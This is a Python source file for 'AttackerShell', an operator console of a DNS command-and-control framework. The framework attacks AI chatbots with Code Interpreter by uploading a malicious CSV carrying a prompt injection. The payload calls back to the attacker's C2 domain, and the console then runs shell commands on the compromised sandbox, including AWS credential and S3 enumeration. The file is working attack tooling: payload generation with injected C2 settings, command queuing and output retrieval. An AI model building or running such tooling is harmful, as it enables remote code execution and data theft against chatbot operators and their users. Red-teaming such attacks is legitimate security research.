#!/usr/bin/env python3
"""
AttackerShell - DNS C2 Operator Shell

This tool allows an attacker to interact with compromised sessions via the C2 server.
The attacker DOES NOT have direct access to Code Interpreter - they only interact
with their own C2 server via HTTP API.

Attack Flow:
1. Generate malicious CSV: make generate-csv
2. Upload CSV to victim chatbot (victim's Code Interpreter executes payload)
3. Payload calls back to attacker's C2 server via DNS
4. Attach to session: make attach SESSION=sess_xxx
5. Send commands and receive output via C2 API

Commands:
- generate: Generate a payload with a specific session ID
- send: Send command to a specific session
- receive: Get output from a specific session
- interactive: Attach to session and interact via C2 API
- attack: Send prompt injection attack to victim chatbot
- generate-csv: Generate malicious CSV for manual upload
"""

import argparse
import base64
import os
import random
import string
import sys
import time
from pathlib import Path
from datetime import datetime

import requests


# Setup logging to both console and file
class TeeOutput:
    """Write to both stdout and a log file."""
    def __init__(self, filename):
        self.terminal = sys.stdout
        self.log = open(filename, 'a', buffering=1)  # Append mode, line buffered
        # Write session start marker
        self.log.write(f"\n{'='*60}\n")
        self.log.write(f"Session started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        self.log.write(f"{'='*60}\n")

    def write(self, message):
        self.terminal.write(message)
        try:
            self.log.write(message)
            self.log.flush()
        except:
            pass

    def flush(self):
        self.terminal.flush()
        try:
            self.log.flush()
        except:
            pass

# Enable logging to file
sys.stdout = TeeOutput('attacker_shell.log')
sys.stderr = sys.stdout


class SessionManager:
    """Manages C2 sessions and payloads via HTTP API to C2 server."""

    def __init__(self, c2_domain=None, c2_server=None):
        self.c2_domain = c2_domain or os.environ.get('DOMAIN', 'c2.bt-research-control.com')
        self.c2_server = c2_server or f"http://{os.environ.get('EC2_IP', 'localhost')}:8080"
        self.sessions = {}  # Track active sessions

    def generate_session_id(self, prefix='sess'):
        """Generate a unique session ID."""
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"{prefix}_{random_suffix}"

    def create_payload(self, session_id, output_file=None, use_curl_for_exfil=False):
        """
        Create a payload with the specified session ID.

        Args:
            session_id: Unique session identifier
            output_file: Optional file to write payload to
            use_curl_for_exfil: If True, use curl instead of getent for exfiltration
        """
        # Read the template
        template_path = Path(__file__).parent / 'payload_client.py'
        with open(template_path, 'r') as f:
            payload_content = f.read()

        # Replace the session placeholder
        payload_content = payload_content.replace('SESSION_PLACEHOLDER', session_id)

        # Replace domain if needed
        payload_content = payload_content.replace(
            "os.environ.get('C2_DOMAIN', 'c2.bt-research-control.com')",
            f"'{self.c2_domain}'"
        )

        # Set exfiltration method if requested
        if use_curl_for_exfil:
            payload_content = payload_content.replace(
                "os.environ.get('USE_CURL_FOR_EXFIL', 'false').lower() == 'true'",
                "True  # Enabled: use curl to avoid getent caching"
            )

        if output_file:
            with open(output_file, 'w') as f:
                f.write(payload_content)
            return output_file

        return payload_content

    def queue_command(self, session_id, command):
        """Send a command to the C2 server for a specific session."""
        try:
            response = requests.post(
                f"{self.c2_server}/api/command",
                json={'command': command, 'session': session_id},
                timeout=5
            )
            return response.status_code == 200
        except Exception as e:
            print(f"[!] Error sending command: {e}")
            return False

    def get_output(self, session_id, since_id=0):
        """Retrieve output for a specific session."""
        try:
            response = requests.get(
                f"{self.c2_server}/api/output",
                params={'session': session_id, 'since': since_id},
                timeout=5
            )
            if response.status_code == 200:
                return response.json().get('outputs', [])
        except Exception as e:
            print(f"[!] Error getting output: {e}")
        return []

    def terminate_session(self, session_id):
        """Terminate a session on the C2 server."""
        try:
            response = requests.post(
                f"{self.c2_server}/api/terminate",
                json={'session': session_id},
                timeout=5
            )
            return response.status_code == 200
        except Exception as e:
            print(f"[!] Error terminating session: {e}")
            return False

    def check_connection(self):
        """Check if we can connect to the C2 server."""
        try:
            # Use /api/output endpoint since there's no /health endpoint
            response = requests.get(
                f"{self.c2_server}/api/output",
                params={'session': 'healthcheck'},
                timeout=5
            )
            return response.status_code == 200
        except:
            return False


class AttackerShell:
    """Main attacker shell interface - interacts with C2 server only."""

    def __init__(self):
        self.session_manager = SessionManager()
        self.current_session = None
        self.last_output_id = 0

    def cmd_generate(self, args):
        """Generate a payload with a session ID."""
        session_id = args.session or self.session_manager.generate_session_id()
        output_file = args.output

        if output_file:
            self.session_manager.create_payload(session_id, output_file)
            print(f"[+] Payload generated: {output_file}")
        else:
            payload = self.session_manager.create_payload(session_id)
            print(f"[+] Payload generated for session: {session_id}")
            if args.show:
                print("\n--- PAYLOAD ---")
                print(payload)
                print("--- END PAYLOAD ---\n")

        print(f"[*] Session ID: {session_id}")
        print(f"\n[*] Next steps:")
        print(f"    1. Embed this payload in a malicious CSV: make generate-csv")
        print(f"    2. Upload CSV to victim chatbot")
        print(f"    3. Attach to session: make attach SESSION={session_id}")
        return session_id

    def cmd_send(self, args):
        """Send a command to a session."""
        session_id = args.session or self.current_session

        if not session_id:
            print("[!] No session specified. Use --session or run 'interactive --session <id>' first.")
            return

        command = args.command

        if self.session_manager.queue_command(session_id, command):
            print(f"[+] Command sent to session {session_id}: {command}")
        else:
            print(f"[!] Failed to send command")

    def cmd_receive(self, args):
        """Get output from a session."""
        session_id = args.session or self.current_session

        if not session_id:
            print("[!] No session specified. Use --session or run 'interactive --session <id>' first.")
            return

        outputs = self.session_manager.get_output(session_id, self.last_output_id)

        for output in outputs:
            print(f"\n[Output {output['id']}] {output['timestamp']}")
            print(output['data'])
            self.last_output_id = output['id']

        if not outputs:
            print("[*] No new output")

    def cmd_interactive(self, args):
        """Attach to an existing session via C2 API."""
        session_id = args.session

        if not session_id:
            print("[!] Error: --session is required")
            print("")
            print("Usage: make attach SESSION=sess_xxx")
            print("   or: python3 src/attacker_shell.py interactive --session sess_xxx")
            print("")
            print("To get a session ID:")
            print("  1. Run: make generate-csv")
            print("  2. Upload the CSV to the victim chatbot")
            print("  3. Use the session ID shown in generate-csv output")
            return

        print(f"\n{'='*60}")
        print(f"  DNS C2 Operator Shell")
        print(f"{'='*60}")
        print(f"  Session ID: {session_id}")
        print(f"  C2 Server:  {self.session_manager.c2_server}")
        print(f"  C2 Domain:  {self.session_manager.c2_domain}")

        # Check C2 server connectivity
        print(f"\n[*] Checking C2 server connectivity...")
        if not self.session_manager.check_connection():
            print(f"[!] Warning: Cannot reach C2 server at {self.session_manager.c2_server}")
            print(f"[!] Make sure the DNS C2 server is running (make configure-ec2)")

        self.current_session = session_id

        print(f"\n{'─'*60}")
        print(f"  Commands:")
        print(f"{'─'*60}")
        print(f"   <command>  - Execute shell command on target")
        print(f"   status     - Check for pending output")
        print(f"   exit       - Quit (session stays active on target)")
        print(f"   kill       - Terminate session and quit")
        print(f"   help       - Show this help")
        print(f"{'─'*60}\n")

        # Interactive command loop
        try:
            while True:
                # Check for output (non-blocking)
                outputs = self.session_manager.get_output(session_id, self.last_output_id)
                if outputs:
                    for output in outputs:
                        print(f"\n{'─'*60}")
                        print(f"  Output from {session_id}:")
                        print(f"{'─'*60}")
                        print(output['data'])
                        print(f"{'─'*60}\n")
                        self.last_output_id = output['id']

                # Get command with prompt
                try:
                    command = input(f"c2:{session_id}> ").strip()
                except KeyboardInterrupt:
                    print("\n\n[!] Interrupted. Use 'exit' to quit or 'kill' to terminate session.")
                    continue
                except EOFError:
                    print("\n[*] EOF detected, exiting...")
                    break

                if not command:
                    continue

                if command.lower() == 'exit':
                    print("[*] Exiting (session stays active on target)...")
                    break

                elif command.lower() == 'kill':
                    print(f"[*] Terminating session {session_id}...")
                    if self.session_manager.terminate_session(session_id):
                        print("[+] Session terminated (client will exit on next poll)")
                    else:
                        print("[!] Failed to terminate session")
                    break

                elif command.lower() == 'status':
                    outputs = self.session_manager.get_output(session_id, self.last_output_id)
                    if outputs:
                        for output in outputs:
                            print(f"\n[Output {output['id']}]")
                            print(output['data'])
                            self.last_output_id = output['id']
                    else:
                        print("[*] No pending output")
                    continue

                elif command.lower() == 'help':
                    print("\n  Available Commands:")
                    print("   <command>  - Execute shell command on target")
                    print("   status     - Check for pending output")
                    print("   exit       - Quit (session stays active)")
                    print("   kill       - Terminate session and quit")
                    print("   help       - Show this help")
                    print("\n  Examples:")
                    print("   whoami")
                    print("   pwd")
                    print("   ls -la")
                    print("   aws sts get-caller-identity")
                    print("   aws s3 ls")
                    print()
                    continue

                else:
                    # Send command to C2 server
                    print(f"[>] Sending: {command}")
                    if self.session_manager.queue_command(session_id, command):
                        print(f"[+] Command queued")
                        print(f"[*] Waiting for output...\n")

                        # Poll for output with timeout
                        start_time = time.time()
                        timeout = 30
                        got_output = False
                        command_start_output_id = self.last_output_id

                        try:
                            while time.time() - start_time < timeout:
                                outputs = self.session_manager.get_output(session_id, command_start_output_id)
                                if outputs:
                                    for output in outputs:
                                        print(f"{'─'*60}")
                                        print(f"  Output:")
                                        print(f"{'─'*60}")
                                        print(output['data'])
                                        print(f"{'─'*60}\n")
                                        self.last_output_id = output['id']
                                    got_output = True
                                    break
                                time.sleep(1)
                        except KeyboardInterrupt:
                            print(f"\n[!] Stopped waiting (command may still execute)\n")

                        if not got_output:
                            print(f"[!] No output after {timeout}s")
                            print(f"[*] Use 'status' to check later, or 'make logs' for C2 server logs\n")
                    else:
                        print("[!] Failed to send command\n")

        except Exception as e:
            print(f"\n[!] Error: {e}")

        print(f"\n{'='*60}")
        print(f"  Session: {session_id}")
        print(f"  Status: Detached (payload may still be running)")
        print(f"{'='*60}")
        print(f"  To reattach: make attach SESSION={session_id}")
        print(f"{'='*60}\n")

    def cmd_attack(self, args):
        """Send prompt injection attack to victim chatbot."""
        from attack_client import AttackClient

        target = args.target
        if not target:
            target = os.environ.get('VICTIM_URL')

        if not target:
            print("[!] Error: Target URL required. Use --target or set VICTIM_URL env var")
            return

        print(f"\n[*] Launching attack against: {target}")

        client = AttackClient(
            target_url=target,
            c2_domain=self.session_manager.c2_domain,
            verbose=args.verbose if hasattr(args, 'verbose') else False
        )

        session_id = client.run_full_attack(message=args.message)
        self.current_session = session_id

        print(f"\n[*] To interact with the compromised session:")
        print(f"    make attach SESSION={session_id}")

    def cmd_generate_csv(self, args):
        """Generate a malicious CSV for manual upload."""
        from csv_payload_generator import generate_malicious_csv, generate_session_id

        session_id = args.session or generate_session_id()
        output_path = args.output or "malicious_data.csv"

        info = generate_malicious_csv(
            c2_domain=self.session_manager.c2_domain,
            session_id=session_id,
            output_path=output_path,
            injection_style=args.style or "technical"
        )

        print(f"\n{'='*60}")
        print("  MALICIOUS CSV GENERATED")
        print(f"{'='*60}")
        print(f"\n  File:       {info['output_path']}")
        print(f"  Session ID: {info['session_id']}")
        print(f"  C2 Domain:  {info['c2_domain']}")
        print(f"\n{'─'*60}")
        print("  NEXT STEPS:")
        print(f"{'─'*60}")
        print(f"\n  1. Upload CSV to victim's chatbot web interface:")
        print(f"     {info['output_path']}")
        print(f"\n  2. Attach to the session:")
        print(f"     make attach SESSION={info['session_id']}")
        print(f"\n  3. Send commands:")
        print(f"     whoami")
        print(f"     aws sts get-caller-identity")
        print(f"     aws s3 ls")
        print(f"\n{'='*60}\n")

        self.current_session = session_id

    def run(self):
        """Main entry point."""
        parser = argparse.ArgumentParser(
            description='DNS C2 Operator Shell - Interact with compromised sessions via C2 API',
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
Examples:
  Generate malicious CSV:
    python3 src/attacker_shell.py generate-csv

  Attach to session:
    python3 src/attacker_shell.py interactive --session sess_abc123

  Send single command:
    python3 src/attacker_shell.py send "whoami" --session sess_abc123
"""
        )
        subparsers = parser.add_subparsers(dest='command', help='Commands')

        # Generate payload command
        gen_parser = subparsers.add_parser('generate', help='Generate payload file')
        gen_parser.add_argument('--session', help='Session ID (auto-generated if not specified)')
        gen_parser.add_argument('--output', '-o', help='Output file')
        gen_parser.add_argument('--show', action='store_true', help='Show payload content')

        # Send command
        send_parser = subparsers.add_parser('send', help='Send command to session')
        send_parser.add_argument('cmd_to_send', metavar='command', help='Command to execute')
        send_parser.add_argument('--session', required=True, help='Session ID')

        # Receive output
        recv_parser = subparsers.add_parser('receive', help='Get output from session')
        recv_parser.add_argument('--session', required=True, help='Session ID')

        # Interactive mode (attach to session)
        int_parser = subparsers.add_parser('interactive', help='Attach to session interactively')
        int_parser.add_argument('--session', '-s', required=True, help='Session ID to attach to')

        # Attack command (prompt injection via victim chatbot)
        attack_parser = subparsers.add_parser('attack', help='Send prompt injection attack to victim chatbot')
        attack_parser.add_argument('--target', '-t', help='Victim chatbot URL (or set VICTIM_URL env var)')
        attack_parser.add_argument('--message', '-m', help='Analysis request message (camouflage)')
        attack_parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')

        # Generate CSV command
        csv_parser = subparsers.add_parser('generate-csv', help='Generate malicious CSV for manual upload')
        csv_parser.add_argument('--session', help='Session ID (auto-generated if not specified)')
        csv_parser.add_argument('--output', '-o', help='Output file path')
        csv_parser.add_argument('--style', choices=['technical', 'social', 'minimal'], default='technical',
                               help='Injection style (default: technical)')

        args = parser.parse_args()

        if not args.command:
            parser.print_help()
            print("\n" + "="*60)
            print("  Quick Start:")
            print("="*60)
            print("  1. Generate malicious CSV:")
            print("     make generate-csv")
            print("\n  2. Upload CSV to victim chatbot")
            print("\n  3. Attach to session:")
            print("     make attach SESSION=<session_id>")
            print("="*60 + "\n")
            return

        # Execute command
        if args.command == 'generate':
            self.cmd_generate(args)
        elif args.command == 'send':
            args.command = args.cmd_to_send  # Rename to avoid conflict
            self.cmd_send(args)
        elif args.command == 'receive':
            self.cmd_receive(args)
        elif args.command == 'interactive':
            self.cmd_interactive(args)
        elif args.command == 'attack':
            self.cmd_attack(args)
        elif args.command == 'generate-csv':
            self.cmd_generate_csv(args)


if __name__ == '__main__':
    shell = AttackerShell()
    shell.run()
